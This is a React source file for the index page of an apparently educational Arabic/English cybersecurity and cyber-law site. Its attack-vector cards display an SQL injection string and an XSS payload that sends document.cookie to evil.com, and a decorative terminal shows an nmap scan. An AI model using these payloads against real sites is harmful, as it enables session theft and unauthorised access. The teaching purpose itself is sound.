import React, { useEffect } from 'react';
import Navbar from '@/components/Navbar';
import Hero from '@/components/Hero';
import SectionContainer from '@/components/SectionContainer';
import ChapterSection from '@/components/ChapterSection';
import VoiceSearch from '@/components/VoiceSearch';
import { useLanguage } from '@/context/LanguageContext';
import { LanguageProvider } from '@/context/LanguageContext';
import { ExternalLink, ShieldAlert, Target, Binary, Database, User, Code, Lock } from 'lucide-react';
import CyberButton from '@/components/CyberButton';
import { Button } from '@/components/ui/button';

const Index = () => {
  const { t, language } = useLanguage();

  useEffect(() => {
    const animateOnScroll = () => {
      const elements = document.querySelectorAll('.animate-on-scroll');
      elements.forEach(element => {
        const rect = element.getBoundingClientRect();
        const isVisible = (rect.top <= window.innerHeight * 0.8);
        
        if (isVisible) {
          element.classList.add('animate-fade-in');
          element.classList.remove('opacity-0', 'translate-y-8');
        }
      });
    };

    window.addEventListener('scroll', animateOnScroll);
    animateOnScroll(); // Initial check on load
    
    return () => window.removeEventListener('scroll', animateOnScroll);
  }, [language]);

  const chapter1Data = {
    id: 'chapter1',
    titleKey: 'chapter1.title',
    sections: [
      {
        id: 'chapter1-section1',
        titleKey: 'chapter1.section1.title',
        subtitleKey: 'chapter1.section1.subtitle',
        descriptionKey: 'chapter1.section1.p1',
        topics: [
          {
            titleKey: 'chapter1.section1.topic1.title',
            points: [
              'chapter1.section1.topic1.p1',
              'chapter1.section1.topic1.p2',
              'chapter1.section1.topic1.p3',
              'chapter1.section1.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter1.section1.topic2.title',
            points: [
              'chapter1.section1.topic2.p1',
              'chapter1.section1.topic2.p2',
              'chapter1.section1.topic2.p3'
            ]
          }
        ]
      },
      {
        id: 'chapter1-section2',
        titleKey: 'chapter1.section2.title',
        subtitleKey: 'chapter1.section2.subtitle',
        descriptionKey: 'chapter1.section2.p1',
        topics: [
          {
            titleKey: 'chapter1.section2.topic1.title',
            points: [
              'chapter1.section2.topic1.p1',
              'chapter1.section2.topic1.p2',
              'chapter1.section2.topic1.p3',
              'chapter1.section2.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter1.section2.topic2.title',
            points: [
              'chapter1.section2.topic2.p1',
              'chapter1.section2.topic2.p2',
              'chapter1.section2.topic2.p3',
              'chapter1.section2.topic2.p4'
            ]
          }
        ]
      }
    ]
  };

  const chapter2Data = {
    id: 'chapter2',
    titleKey: 'chapter2.title',
    sections: [
      {
        id: 'chapter2-section1',
        titleKey: 'chapter2.section1.title',
        subtitleKey: 'chapter2.section1.subtitle',
        descriptionKey: 'chapter2.section1.p1',
        topics: [
          {
            titleKey: 'chapter2.section1.topic1.title',
            points: [
              'chapter2.section1.topic1.p1',
              'chapter2.section1.topic1.p2',
              'chapter2.section1.topic1.p3',
              'chapter2.section1.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter2.section1.topic2.title',
            points: [
              'chapter2.section1.topic2.p1',
              'chapter2.section1.topic2.p2',
              'chapter2.section1.topic2.p3',
              'chapter2.section1.topic2.p4'
            ]
          }
        ]
      },
      {
        id: 'chapter2-section2',
        titleKey: 'chapter2.section2.title',
        subtitleKey: 'chapter2.section2.subtitle',
        descriptionKey: 'chapter2.section2.p1',
        topics: [
          {
            titleKey: 'chapter2.section2.topic1.title',
            points: [
              'chapter2.section2.topic1.p1',
              'chapter2.section2.topic1.p2',
              'chapter2.section2.topic1.p3',
              'chapter2.section2.topic1.p4'
            ]
          },
          {
            titleKey: 'chapter2.section2.topic2.title',
            points: [
              'chapter2.section2.topic2.p1',
              'chapter2.section2.topic2.p2',
              'chapter2.section2.topic2.p3',
              'chapter2.section2.topic2.p4'
            ]
          }
        ]
      }
    ]
  };

  const referenceSources = {
    arabic: [
      {
        title: 'القانون رقم 18-07 المتعلق بحماية الأشخاص الطبيعيين في مجال معالجة المعطيات ذات الطابع الشخصي',
        url: 'https://www.joradp.dz/FTP/JO-ARABE/2018/A2018034.pdf'
      },
      {
        title: 'الأمن السيبراني وحماية المعلومات - د. محمد الألفي',
        url: 'https://books.google.com/books/about/الأمن_السيبراني_وحماية_المعلومات.html'
      },
      {
        title: 'قانون العقوبات الجزائري - المواد المتعلقة بالجرائم المعلوماتية',
        url: 'https://www.joradp.dz/trv/apenal.pdf'
      },
      {
        title: 'الأمن الرقمي والجرائم الإلكترونية - المجلة الجزائرية للدراسات القانونية',
        url: 'https://www.asjp.cerist.dz/en/article/97878'
      }
    ],
    international: [
      {
        title: 'NIST Cybersecurity Framework (2023)',
        url: 'https://www.nist.gov/cyberframework'
      },
      {
        title: 'Stuttard, D., & Pinto, M. (2021). The Web Application Hacker\'s Handbook: Finding and Exploiting Security Flaws',
        url: 'https://portswigger.net/web-security/web-application-hackers-handbook'
      },
      {
        title: 'Seitz, J. (2021). Black Hat Python: Python Programming for Hackers and Pentesters',
        url: 'https://nostarch.com/black-hat-python2E'
      },
      {
        title: 'SANS Institute (2022). Security Awareness Training Reports',
        url: 'https://www.sans.org/security-awareness-training/'
      },
      {
        title: 'European Union Agency for Cybersecurity (ENISA) Reports',
        url: 'https://www.enisa.europa.eu/publications'
      }
    ],
    online: [
      {
        title: 'OWASP Top 10 Web Application Security Risks',
        url: 'https://owasp.org/www-project-top-ten/'
      },
      {
        title: 'Kali Linux Documentation and Tools',
        url: 'https://www.kali.org/'
      },
      {
        title: 'Metasploit Framework Documentation',
        url: 'https://docs.metasploit.com/'
      },
      {
        title: 'Wireshark Network Analysis Guide',
        url: 'https://www.wireshark.org/docs/'
      },
      {
        title: 'Kaspersky Global Research and Analysis Team (GReAT) Reports',
        url: 'https://securelist.com/'
      },
      {
        title: 'Symantec Internet Security Threat Reports',
        url: 'https://www.broadcom.com/support/security-center'
      }
    ]
  };

  const latestThreats = [
    {
      title: "New Ransomware Strain Targeting Healthcare",
      date: "2023-05-12",
      severity: "High",
      description: "A sophisticated ransomware variant is specifically targeting healthcare institutions."
    },
    {
      title: "Critical Zero-day in Popular Web Framework",
      date: "2023-06-03",
      severity: "Critical",
      description: "Researchers discovered a remote code execution vulnerability affecting millions of websites."
    },
    {
      title: "Advanced Phishing Campaign Bypassing MFA",
      date: "2023-06-15",
      severity: "Medium",
      description: "New social engineering techniques are being used to bypass multi-factor authentication."
    },
    {
      title: "Supply Chain Attack on Open Source Libraries",
      date: "2023-07-02",
      severity: "High",
      description: "Malicious code was discovered in several popular open source packages."
    }
  ];

  return (
    <div className="min-h-screen bg-cyber-dark overflow-x-hidden binary-bg">
      <Navbar />
      <Hero />

      {/* Introduction Section */}
      <SectionContainer id="introduction" className="grid-bg">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-16 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('intro.title')}</h2>
            <p className="text-xl text-white/70">{t('intro.subtitle')}</p>
          </div>
          
          <div className="space-y-6 cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
            <p className="text-white/80 leading-relaxed">{t('intro.p1')}</p>
            <p className="text-white/80 leading-relaxed">{t('intro.p2')}</p>
            <p className="text-white/80 leading-relaxed">{t('intro.p3')}</p>
            
            <div className="mt-8 bg-cyber-darker p-4 rounded-md border border-cyber-accent/20 font-mono text-sm overflow-hidden">
              <div className="flex items-center mb-2 text-white/60 text-xs">
                <div className="w-3 h-3 rounded-full bg-red-500 mr-2"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500 mr-2"></div>
                <div className="w-3 h-3 rounded-full bg-green-500 mr-2"></div>
                <span>terminal@cybersec ~ </span>
              </div>
              <div className="hacking-animation text-cyber-accent">
                $ nmap -p 1-1000 -T4 -A -v target.com
              </div>
              <p className="text-white/50 mt-3">Scanning for open ports and vulnerabilities...</p>
              <p className="text-white/50">Discovered potential security weaknesses...</p>
            </div>
          </div>

          <div className="mt-16 animate-on-scroll opacity-0 translate-y-8">
            <div className="flex items-center mb-6">
              <ShieldAlert className="text-red-400 mr-2" />
              <h3 className="text-xl text-gradient font-medium">{t('securityFeed.title')}</h3>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {latestThreats.map((threat, index) => (
                <div key={index} className="cyber-card p-4 rounded-lg text-white/80">
                  <div className="flex justify-between items-start mb-2">
                    <h4 className="text-white font-medium">{threat.title}</h4>
                    <span className={`px-2 py-0.5 rounded text-xs ${
                      threat.severity === "Critical" ? "bg-red-900/50 text-red-200" :
                      threat.severity === "High" ? "bg-orange-900/50 text-orange-200" :
                      "bg-yellow-900/50 text-yellow-200"
                    }`}>
                      {threat.severity}
                    </span>
                  </div>
                  <p className="text-xs text-white/50 mb-2">{threat.date}</p>
                  <p className="text-sm">{threat.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Voice Search Section */}
      <SectionContainer id="voice-search" className="bg-cyber-darker">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">
              {language === 'ar' ? 'مساعدك الصوتي في الأمن السيبراني' : 'Your Cybersecurity Voice Assistant'}
            </h2>
            <p className="text-xl text-white/70">
              {language === 'ar' ? 'تحدث مع المساعد للحصول على معلومات حول الأمن السيبراني والقوانين ذات الصلة' : 'Speak to the assistant for information about cybersecurity and related laws'}
            </p>
          </div>
          
          <div className="animate-on-scroll opacity-0 translate-y-8">
            <VoiceSearch />
          </div>
        </div>
      </SectionContainer>

      {/* Chapter 1: Hacking Strategies */}
      <ChapterSection {...chapter1Data} />

      {/* New Interactive Element: Common Attack Vectors */}
      <SectionContainer id="attack-vectors" className="bg-cyber-darker">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('attackVectors.title')}</h2>
            <p className="text-xl text-white/70">{t('attackVectors.subtitle')}</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-on-scroll opacity-0 translate-y-8">
            {/* SQL Injection Attack Vector */}
            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
              <div className="flex justify-center mb-4">
                <Database className="h-12 w-12 text-cyber-accent" />
              </div>
              <h3 className="text-xl text-center font-medium text-white mb-3">SQL Injection</h3>
              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
              <p className="text-white/70 text-sm">
                {t('attackVectors.sqlInjection')}
              </p>
              <div className="mt-4 p-2 bg-cyber-darker rounded font-mono text-xs text-cyber-accent">
                <code>admin' OR 1=1--</code>
              </div>
            </div>
            
            {/* Cross-Site Scripting Attack Vector */}
            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
              <div className="flex justify-center mb-4">
                <Code className="h-12 w-12 text-cyber-accent" />
              </div>
              <h3 className="text-xl text-center font-medium text-white mb-3">XSS</h3>
              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
              <p className="text-white/70 text-sm">
                {t('attackVectors.xss')}
              </p>
              <div className="mt-4 p-2 bg-cyber-darker rounded font-mono text-xs text-cyber-accent">
                <code>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</code>
              </div>
            </div>
            
            {/* Social Engineering Attack Vector */}
            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
              <div className="flex justify-center mb-4">
                <User className="h-12 w-12 text-cyber-accent" />
              </div>
              <h3 className="text-xl text-center font-medium text-white mb-3">{t('attackVectors.socialEngineeringTitle')}</h3>
              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
              <p className="text-white/70 text-sm">
                {t('attackVectors.socialEngineering')}
              </p>
              <div className="mt-4 text-center">
                <Button variant="outline" className="text-xs cyber-btn-glow">
                  {t('attackVectors.learnMore')}
                </Button>
              </div>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Chapter 2: Legal Framework */}
      <ChapterSection {...chapter2Data} />

      {/* New Interactive Section: Defense Strategies */}
      <SectionContainer id="defense-strategies">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('defenseStrategies.title')}</h2>
            <p className="text-xl text-white/70">{t('defenseStrategies.subtitle')}</p>
          </div>
          
          <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div>
                <div className="flex items-center mb-4">
                  <Lock className="text-cyber-accent mr-3" />
                  <h3 className="text-xl font-medium">{t('defenseStrategies.technicalTitle')}</h3>
                </div>
                <ul className="space-y-3 text-white/80">
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">1</div>
                    <p>{t('defenseStrategies.technical1')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">2</div>
                    <p>{t('defenseStrategies.technical2')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">3</div>
                    <p>{t('defenseStrategies.technical3')}</p>
                  </li>
                </ul>
              </div>
              
              <div>
                <div className="flex items-center mb-4">
                  <ShieldAlert className="text-cyber-accent mr-3" />
                  <h3 className="text-xl font-medium">{t('defenseStrategies.legalTitle')}</h3>
                </div>
                <ul className="space-y-3 text-white/80">
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">1</div>
                    <p>{t('defenseStrategies.legal1')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">2</div>
                    <p>{t('defenseStrategies.legal2')}</p>
                  </li>
                  <li className="flex items-start">
                    <div className="h-6 w-6 rounded-full bg-cyber-accent/20 flex items-center justify-center text-cyber-accent mr-2 mt-0.5">3</div>
                    <p>{t('defenseStrategies.legal3')}</p>
                  </li>
                </ul>
              </div>
            </div>
            
            <div className="mt-8 pt-8 border-t border-white/10">
              <div className="sidebar-glow">
                <h4 className="text-lg font-medium text-white mb-4">{t('defenseStrategies.bestPracticesTitle')}</h4>
                <p className="text-white/80 mb-4">{t('defenseStrategies.bestPracticesDesc')}</p>
                <Button className="cyber-btn-glow mt-2">
                  {t('defenseStrategies.downloadGuide')}
                </Button>
              </div>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* Conclusion Section */}
      <SectionContainer id="conclusion" className="bg-cyber-darker">
        <div className="max-w-4xl mx-auto text-center space-y-16">
          <div className="animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('conclusion.title')}</h2>
            <p className="text-xl text-white/70 mb-8">{t('conclusion.subtitle')}</p>
          </div>
          
          <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8 text-left">
            <div className="space-y-6">
              <p className="text-white/80 leading-relaxed">{t('conclusion.p1')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p2')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p3')}</p>
              <p className="text-white/80 leading-relaxed">{t('conclusion.p4')}</p>
            </div>
          </div>
        </div>
      </SectionContainer>

      {/* References Section with Clickable Links */}
      <SectionContainer id="references">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-16 animate-on-scroll opacity-0 translate-y-8">
            <h2 className="cyber-heading text-gradient mb-4">{t('references.title')}</h2>
            <p className="text-xl text-white/70">{t('references.subtitle')}</p>
          </div>
          
          <div className="space-y-12">
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.arabic')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.arabic.map((source, index) => (
                  <li key={`arabic-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
            
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.international')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.international.map((source, index) => (
                  <li key={`international-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
            
            <div className="cyber-card p-8 rounded-2xl animate-on-scroll opacity-0 translate-y-8">
              <h3 className="text-white mb-6 pb-3 border-b border-white/10">{t('references.online')}</h3>
              <ul className="list-disc list-inside space-y-3 text-white/80">
                {referenceSources.online.map((source, index) => (
                  <li key={`online-${index}`}>
                    <a href={source.url} target="_blank" rel="noopener noreferrer" className="source-link">
                      {source.title}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>
          
          <div className="mt-12 cyber-card p-6 rounded-xl animate-on-scroll opacity-0 translate-y-8">
            <h4 className="neon-text mb-4">{t('references.citationTitle')}</h4>
            <p className="text-white/80 text-sm">{t('references.citationDesc')}</p>
          </div>
        </div>
      </SectionContainer>

      <footer className="py-10 border-t border-white/10 bg-cyber-darker">
        <div className="container mx-auto px-4 text-center">
          <p className="text-white/60 text-sm">
            &copy; 2023 {t('footer.rights')} • {t('footer.disclaimer')}
          </p>
          <div className="flex justify-center mt-4 space-x-4">
            <a href="#introduction" className="cyber-link text-sm">
              {t('footer.intro')}
            </a>
            <a href="#chapter1" className="cyber-link text-sm">
              {t('footer.hacking')}
            </a>
            <a href="#chapter2" className="cyber-link text-sm">
              {t('footer.legal')}
            </a>
            <a href="#references" className="cyber-link text-sm">
              {t('footer.references')}
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

const IndexWithLanguage = () => {
  return (
    <LanguageProvider>
      <Index />
    </LanguageProvider>
  );
};

export default IndexWithLanguage;
